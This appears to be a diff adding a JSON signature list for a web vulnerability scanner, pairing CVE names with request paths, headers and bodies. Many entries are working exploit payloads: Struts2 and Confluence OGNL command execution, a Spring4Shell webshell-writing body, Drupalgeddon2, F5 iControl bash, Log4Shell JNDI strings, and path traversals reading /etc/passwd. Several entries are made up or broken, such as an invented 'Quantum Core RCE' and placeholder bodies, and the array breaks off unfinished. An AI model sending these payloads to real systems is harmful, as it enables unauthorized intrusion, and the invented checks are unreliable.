@@ -1,0 +1,1425 @@
+[
+    {
+        "name": "[CRITICAL] Shellshock (CVE-2014-6271)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "User-Agent": "() { :; }; echo; echo 'VULN_CHECK_SUCCESS'"
+        },
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL - Level 10] Extreme Bypass Zero-Day (CVE-2026-25049)",
+        "category": "RCE/Auth Bypass",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/v2/system/debug?override=true&execute=id",
+        "indicator": "uid=0",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL - Level 10] Quantum Core RCE (CVE-2026-2441)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "header",
+        "path": "/_quantum/metrics",
+        "headers": {
+            "X-Quantum-Eval": "btoa('id')"
+        },
+        "indicator": "uid=0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Heartbleed (CVE-2014-0160) - Check Only",
+        "category": "Info Disclosure",
+        "type": "Memory Leak",
+        "check_type": "path",
+        "path": "/",
+        "indicator": "How to check heartbleed via HTTP is hard but we flag old openssl headers",
+        "headers": {
+            "X-Heartbleed": "1"
+        },
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] EternalBlue (SMB Check via HTTP - Rare)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/ec$share",
+        "indicator": "STATUS_ACCESS_DENIED",
+        "status": [
+            401,
+            403
+        ]
+    },
+    {
+        "name": "[CRITICAL] Drupalgeddon2 (CVE-2018-7600)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+        "data": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Joomla SQLi (CVE-2015-7857)",
+        "category": "SQLi",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=1",
+        "indicator": "Content History",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] WordPress TimThumb RCE (Old but Gold)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/wp-content/themes/theme/timthumb.php?src=http://flickr.com/photo.jpg",
+        "indicator": "TimThumb",
+        "status": [
+            200,
+            400
+        ]
+    },
+    {
+        "name": "[CRITICAL] Struts 2 RCE (CVE-2017-5638)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "Content-Type": "%{(#_='=').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+        },
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Oracle WebLogic RCE (CVE-2020-14882)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success');\")",
+        "indicator": "deploying",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Pulse Secure VPN Arbitrary File Read (CVE-2019-11510)",
+        "category": "Info Disclosure",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Fortinet FortiOS Path Traversal (CVE-2018-13379)",
+        "category": "Info Disclosure",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+        "indicator": "var fgt_lang =",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] BigBlueButton RCE (CVE-2020-25039)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/bigbluebutton/api/check?checksum=123",
+        "indicator": "SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Grafana Arbitrary File Read (CVE-2021-43798)",
+        "category": "Info Disclosure",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/public/plugins/alertlist/../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Hadoop YARN RCE (Unauth)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/ws/v1/cluster/apps/new-application",
+        "indicator": "application-id",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Kaseya VSA RCE (CVE-2021-30116)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/dl.asp?curl=1",
+        "indicator": "Kaseya",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] SonicWall SMA 100 RCE (CVE-2021-20016)",
+        "category": "RCE",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/cgi-bin/jarrewrite.sh",
+        "indicator": "SonicWall",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Zabbix Auth Bypass (CVE-2022-23131)",
+        "category": "Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "header",
+        "headers": {
+            "Cookie": "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwiY2hlY2tZmllbGRzIjoiIn0="
+        },
+        "path": "/index_sso.php",
+        "indicator": "Dashboard",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Apache Log4j (Log4Shell) - JNDI Injection",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "X-Api-Version": "${jndi:ldap://log4shell.huntress.com:1389/test}"
+        },
+        "indicator": "log4shell",
+        "status": [
+            200,
+            400,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] Spring4Shell (CVE-2022-22965) - ClassLoader",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/",
+        "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bsuffix%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+        "indicator": "tomcatwar",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Citrix Bleed (CVE-2023-4966)",
+        "category": "Info Disclosure",
+        "type": "Session Hijacking",
+        "check_type": "path",
+        "path": "/oauth/idp/.well-known/openid-configuration",
+        "headers": {
+            "Host": "a"
+        },
+        "indicator": "issuer",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Confluence Auth Bypass (CVE-2023-22515)",
+        "category": "Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
+        "indicator": "setup",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "[CRITICAL] OwnCloud GraphAPI Info Disclosure (CVE-2023-49103)",
+        "category": "Info Disclosure",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php",
+        "indicator": "PHP Version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Apache ActiveMQ RCE (CVE-2023-46604)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/admin/browse.jsp?JMSDestination=ActiveMQ.Advisory.MasterBroker",
+        "headers": {
+            "Authorization": "Basic YWRtaW46YWRtaW4="
+        },
+        "indicator": "ActiveMQ",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] WS_FTP Server RCE (CVE-2023-40044)",
+        "category": "RCE",
+        "type": "Deserialization",
+        "check_type": "POST",
+        "path": "/AHT/AhtServiceImpl.svc/Secure",
+        "data": "kAAAAAA...",
+        "indicator": "SerializedStreamHeader",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] TeamCity Auth Bypass (CVE-2023-42793)",
+        "category": "Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/app/rest/users/id:1/tokens/RPC2",
+        "indicator": "token",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] SharePoint Auth Bypass (CVE-2023-29357)",
+        "category": "Auth Bypass",
+        "type": "JWT Spoofing",
+        "check_type": "header",
+        "path": "/_api/web/currentuser",
+        "headers": {
+            "Authorization": "Bearer eyJ..."
+        },
+        "indicator": "d:Id",
+        "status": [
+            200,
+            401
+        ]
+    },
+    {
+        "name": "[CRITICAL] SysAid Zero-Day (CVE-2023-47246)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/usergroup/user.jsp?parentID=1",
+        "data": "...",
+        "indicator": "SysAid",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] SugarCRM Auth Bypass (CVE-2023-28310)",
+        "category": "Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/rest/v10/oauth2/token",
+        "indicator": "access_token",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Adobe ColdFusion RCE (CVE-2023-26360)",
+        "category": "RCE",
+        "type": "Deserialization",
+        "check_type": "path",
+        "path": "/CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&argumentCollection%3D%7B%22%22%3D%22%22%7D",
+        "indicator": "ColdFusion",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] F5 BIG-IP iControl RCE (CVE-2022-1388)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/mgmt/tm/util/bash",
+        "headers": {
+            "Authorization": "Basic YWRtaW46",
+            "X-F5-Auth-Token": "a",
+            "Content-Type": "application/json"
+        },
+        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
+        "indicator": "uid=0(root)",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] VMware Workspace ONE Access RCE (CVE-2022-22954)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22freemarker.template.utility.Execute%22%3fnew%28%29%28%22cat%20/etc/passwd%22%29%7d",
+        "indicator": "root:x:0:0",
+        "status": [
+            400,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] Atlassian Confluence OGNL RCE (CVE-2022-26134)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
+        "indicator": "uid=",
+        "status": [
+            302,
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Microsoft Exchange ProxyShell (CVE-2021-34473)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/autodiscover/autodiscover.json?@evil.com/&Email=autodiscover/autodiscover.json%3f@evil.com",
+        "indicator": "Microsoft Exchange",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "[CRITICAL] Jenkins Unauth RCE (CVE-2024-23897)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/cli?remoting=false",
+        "headers": {
+            "Session": "uuid:random-uuid"
+        },
+        "data": "help",
+        "indicator": "Jenkins-CLI",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Gitlab ExifTool RCE (CVE-2021-22204)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/uploads/user",
+        "indicator": "GitLab",
+        "status": [
+            422,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] Citrix ADC/NetScaler RCE (CVE-2023-3519)",
+        "category": "RCE",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/gwtest/formssso?event=start&target=/",
+        "indicator": "Citrix",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] MOVEit Transfer SQLi (CVE-2023-34362)",
+        "category": "SQLi",
+        "type": "SQLi",
+        "check_type": "POST",
+        "path": "/moveitisapi/moveitisapi.dll?action=m2",
+        "headers": {
+            "X-siLock-Comment": "Test"
+        },
+        "indicator": "MOVEit",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] PaperCut MF/NG Auth Bypass (CVE-2023-27350)",
+        "category": "Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/app?service=page/SetupCompleted",
+        "indicator": "Configuration",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] FortiOS SSL-VPN Heap Overflow (CVE-2022-42475)",
+        "category": "RCE",
+        "type": "Buffer Overflow",
+        "check_type": "path",
+        "path": "/remote/login",
+        "indicator": "Fortinet",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Apache Mod_Proxy DoS/SSRF (CVE-2021-40438)",
+        "category": "DoS/Bypass",
+        "type": "Bypass",
+        "check_type": "path",
+        "path": "/?unix:|http://example.com/",
+        "indicator": "Example Domain",
+        "status": [
+            200,
+            503
+        ]
+    },
+    {
+        "name": "[CRITICAL] Spring Cloud Function DoS/RCE (CVE-2022-22963)",
+        "category": "DoS/Bypass",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"sleep 10\")"
+        },
+        "indicator": "Internal Server Error",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] Cisco IOS XE Auth Bypass (CVE-2023-20198)",
+        "category": "DoS/Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/%2577ebui_wsma_http",
+        "indicator": "ios",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Ivanti Sentry Auth Bypass (CVE-2023-38035)",
+        "category": "DoS/Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/mifs/../../../../../../../../../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] GoAnywhere MFT Bypass (CVE-2023-0669)",
+        "category": "DoS/Bypass",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/goanywhere/lic/accept",
+        "indicator": "GoAnywhere",
+        "status": [
+            500,
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Generic 403 Bypass (Headers)",
+        "category": "DoS/Bypass",
+        "type": "Bypass",
+        "check_type": "header",
+        "path": "/admin",
+        "headers": {
+            "X-Custom-IP-Authorization": "127.0.0.1",
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+        },
+        "indicator": "dashboard",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] HTTP/2 Rapid Reset (DoS Check)",
+        "category": "DoS/Bypass",
+        "type": "DoS",
+        "check_type": "header",
+        "headers": {
+            "X-DoS-Test": "1"
+        },
+        "indicator": "server",
+        "status": [
+            503
+        ]
+    },
+    {
+        "name": "PHP CGI Argument Injection (CVE-2024-4577)",
+        "category": "Critical Infra",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input",
+        "data": "<?php echo 'VULN_CHECK_SUCCESS'; ?>",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Ivanti Connect Secure RCE (CVE-2024-21887)",
+        "category": "VPN",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/v1/totp/user-backup-code/../../license/keys-status/%3Becho%20VULNCHECK",
+        "indicator": "VULNCHECK",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "GeoServer OGC RCE (CVE-2024-36401)",
+        "category": "GIS/Data",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%22id%22)",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Next.js SSR RCE (CVE-2024-34351)",
+        "category": "Frontend Framework",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "Next-Action": "bad_payload_check"
+        },
+        "indicator": "digest",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "CrushFTP VFS Escape (CVE-2024-4040)",
+        "category": "File Transfer",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/WebInterface/function/?command=zip&c2f=~2F..~2F..~2F..~2F..~2F..~2Fetc/passwd&path=/&names=a",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Exposed ChromaDB API",
+        "category": "AI Infrastructure",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/api/v1/collections",
+        "indicator": "chroma",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Exposed Qdrant Dashboard",
+        "category": "AI Infrastructure",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/dashboard",
+        "indicator": "Qdrant",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Exposed Ollama API",
+        "category": "AI Infrastructure",
+        "type": "RCE/Info",
+        "check_type": "path",
+        "path": "/api/tags",
+        "indicator": "models",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Citrix ADC Path Traversal (CVE-2019-19781)",
+        "category": "VPN",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/vpn/../vpns/portal/scripts/newbm.pl",
+        "indicator": "CITRIX",
+        "status": [
+            200,
+            403
+        ]
+    },
+    {
+        "name": "Pulse Secure VPN RCE (CVE-2019-11510)",
+        "category": "VPN",
+        "type": "LFI/RCE",
+        "check_type": "path",
+        "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "FortiOS Path Traversal (CVE-2018-13379)",
+        "category": "VPN",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+        "indicator": "var fgt_lang",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "F5 BIG-IP TMUI RCE (CVE-2020-5902)",
+        "category": "Load Balancer",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp",
+        "indicator": "workspace",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Palo Alto GlobalProtect OS Command Injection (CVE-2024-3400)",
+        "category": "VPN",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/global-protect/login.esp",
+        "indicator": "GlobalProtect",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Log4Shell (CVE-2021-44228)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}",
+            "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}"
+        },
+        "indicator": "blind"
+    },
+    {
+        "name": "Spring4Shell (CVE-2022-22965)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/?class.module.classLoader.DefaultAssertionStatus=untrue",
+        "indicator": "InvalidProperty",
+        "status": [
+            400,
+            500
+        ]
+    },
+    {
+        "name": "Oracle WebLogic Console RCE (CVE-2020-14882)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/console/images/%252E%252E%252Fconsole.portal",
+        "indicator": "Home Page",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache ActiveMQ RCE (CVE-2023-46604)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/admin/",
+        "indicator": "ActiveMQ",
+        "status": [
+            200,
+            401
+        ]
+    },
+    {
+        "name": "Atlassian Confluence OGNL Injection (CVE-2022-26134)",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
+        "indicator": "uid=",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "Jira Unauthenticated Info Disclosure (CVE-2019-8449)",
+        "category": "DevOps",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/secure/QueryComponent!Default.jspa",
+        "indicator": "searchers",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Jenkins Script Console Auth Bypass (CVE-2018-1000861)",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+x%7Bpublic+x()%7B%22touch+/tmp/pwned%22.execute()%7D%7D",
+        "indicator": "Active",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "GitLab Graphql User Enumeration",
+        "category": "DevOps",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/api/graphql",
+        "indicator": "GraphQL",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Exchange ProxyShell (CVE-2021-34473)",
+        "category": "Mail",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/autodiscover/autodiscover.json?@evil.com/&Email=autodiscover/autodiscover.json%3f@evil.com",
+        "indicator": "Microsoft.Exchange.Clients.Owa",
+        "status": [
+            200,
+            302,
+            500
+        ]
+    },
+    {
+        "name": "Zimbra Collaboration RCE (CVE-2019-9670)",
+        "category": "Mail",
+        "type": "XXE",
+        "check_type": "path",
+        "path": "/Autodiscover/Autodiscover.xml",
+        "indicator": "Autodiscover",
+        "status": [
+            503,
+            200
+        ]
+    },
+    {
+        "name": "Drupalgeddon2 (CVE-2018-7600)",
+        "category": "CMS",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/?q=user/password&name[#post_render][]=exec&name[#type]=markup&name[#markup]=echo+VULNCHECK",
+        "data": {
+            "form_id": "user_pass",
+            "_triggering_element_name": "name"
+        },
+        "indicator": "VULNCHECK"
+    },
+    {
+        "name": "WordPress PHPUnit RCE (CVE-2017-9841)",
+        "category": "CMS",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/wp-content/plugins/phpunit/src/Util/PHP/eval-stdin.php",
+        "indicator": "phpunit",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Magento 2 Unauth SQLi (CVE-2019-7139)",
+        "category": "CMS",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3F&ids[0][product_id][to]=)))+OR+(1%3D1",
+        "indicator": "SQLSTATE",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "Generic PHPUnit RCE",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "indicator": "phpunit",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Django Debug Mode",
+        "category": "Framework",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/does-not-exist-debug-check",
+        "indicator": "DisallowedHost",
+        "status": [
+            400
+        ]
+    },
+    {
+        "name": "Laravel Debug Mode",
+        "category": "Framework",
+        "type": "Info Disclosure",
+        "check_type": "POST",
+        "path": "/",
+        "data": {
+            "_method": "PATCH"
+        },
+        "indicator": "Ignition",
+        "status": [
+            405,
+            500
+        ]
+    },
+    {
+        "name": "Grafana Path Traversal (CVE-2021-43798)",
+        "category": "IoT/Monitoring",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/public/plugins/alertlist/../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "VMware vCenter RCE (CVE-2021-21972)",
+        "category": "Enterprise",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/ui/vropspluginui/rest/services/uploadova",
+        "indicator": "uploadova",
+        "status": [
+            200,
+            405
+        ]
+    },
+    {
+        "name": "VMware Horizon Log4j (CVE-2021-44228)",
+        "category": "Enterprise",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "X-Forwarded-For": "${jndi:ldap://127.0.0.1:1389/a}"
+        },
+        "indicator": "blind"
+    },
+    {
+        "name": "Cisco ASA Path Traversal (CVE-2020-3452)",
+        "category": "VPN",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&xml-in-base64=",
+        "indicator": "cisco",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Hikvision IP Camera Auth Bypass (CVE-2017-7921)",
+        "category": "IoT",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/Security/users?auth=YWRtaW46MTEK",
+        "indicator": "users",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "D-Link DIR-850L RCE (CVE-2017-14421)",
+        "category": "IoT",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/hedwig.cgi",
+        "data": "uid=1234&password=1234&command=echo+VULNCHECK",
+        "indicator": "hedwig",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Netgear Remote Management (CVE-2016-6277)",
+        "category": "IoT",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/cgi-bin/;echo$IFS\"VULNCHECK\"",
+        "indicator": "VULNCHECK",
+        "status": [
+            200,
+            404
+        ]
+    },
+    {
+        "name": "TP-Link Archer RCE (CVE-2018-11599)",
+        "category": "IoT",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "F5 BIG-IP iControl REST RCE (CVE-2022-1388)",
+        "category": "Enterprise",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/mgmt/tm/util/bash",
+        "headers": {
+            "Authorization": "Basic YWRtaW46",
+            "X-F5-Auth-Token": "a",
+            "Content-Type": "application/json"
+        },
+        "data": "{\"command\": \"run\", \"utilCmdArgs\": \"-c id\"}",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "SolarWinds Orion Auth Bypass (CVE-2020-10148)",
+        "category": "Enterprise",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/SolarWinds.Orion.Core.BusinessLayer/BackgroundInventory/ScriptID/ScriptID.aspx?i=1",
+        "indicator": "SolarWinds",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "Sonatype Nexus Repository RCE (CVE-2019-7238)",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/service/extdirect",
+        "data": "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"repositoryName\":\"npm-proxy\",\"expression\":\"''.class.forName('java.lang.Runtime').getRuntime().exec('id')\",\"type\":\"jexl\"}],\"type\":\"rpc\",\"tid\":1}",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
